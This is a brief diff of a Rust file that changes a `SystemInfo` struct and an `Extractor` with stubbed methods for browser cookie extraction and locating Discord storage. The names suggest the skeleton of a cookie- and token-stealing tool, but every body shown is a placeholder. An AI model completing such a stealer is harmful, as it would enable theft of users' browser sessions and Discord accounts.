@@ -28,14 +28,10 @@ struct BrowserCookie {
 }
 
 #[derive(Serialize, Deserialize, Default)]
-struct SystemInfo {
-  #[serde(default)]
-  user_agent: Option<String>,
+pub struct SystemInfo {
   os: String,
   cpu: String,
-  #[serde(default)]
-  gpu: Option<String>,
-  ram: u64,
+  ram: String,
 }
 
 
@@ -52,11 +48,6 @@ impl Extractor {
     pub fn extract_browser_data(&self) -> Vec<BrowserCookie> {
         // Placeholder
         Vec::new()
-    }
-
-    pub fn collect_system_info(&self) -> SystemInfo {
-        // Placeholder
-        SystemInfo::default()
     }
 
     fn find_discord_storage_location(&self) -> Option<String> {
